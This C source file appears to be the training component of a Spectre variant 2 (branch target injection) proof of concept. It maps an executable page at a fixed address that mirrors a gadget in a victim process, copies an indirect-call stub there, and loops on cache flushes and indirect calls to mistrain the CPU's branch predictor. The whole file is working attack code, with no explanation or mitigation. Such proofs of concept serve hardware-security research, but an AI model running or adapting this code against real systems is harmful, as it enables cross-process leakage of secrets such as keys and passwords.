#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include "../common.h"

/*
 * This is the target of the indirect call
 * which we locate at the address of a gadget
 * in the "victim" process we are trying to
 * (mis)train the processor's BTB to call
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
}


#define TARGET_FN_ADDR 0x414100401000
uint64_t jmp_ptr;
void *map;

void train()
{
    fn_ptr = target_fn;
    //fn_ptr = map+600;
    printf("fn_ptr: %p\n", fn_ptr);
    //jmp_ptr = 0x400e60;
    jmp_ptr = 0;
    while (1) {
        _mm_clflush(fn_ptr);
        _mm_clflush(&jmp_ptr);
        indirect(&jmp_ptr);
        //((void (*)(void *))map)(&jmp_ptr);
    }
}

int main(int argc, char *argv[])
{
    fn_ptr = target_fn;
    printf("&fn_ptr = %p\n", &fn_ptr);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);
    printf("target_fn = %p\n", target_fn);

    printf("training...\n");

    uint64_t base = TARGET_FN_ADDR;
    if (argc > 1) {
        base = strtoll(argv[1], NULL, 16);
    }
    printf("using base address %p\n", (void*)base);
    map = mmap((void*)base, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return -1;
    }
    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));

    // Set it to just immediately return (retq = 0xc3)...
    memset(map+600, '\xc3', 1);


    train();

}
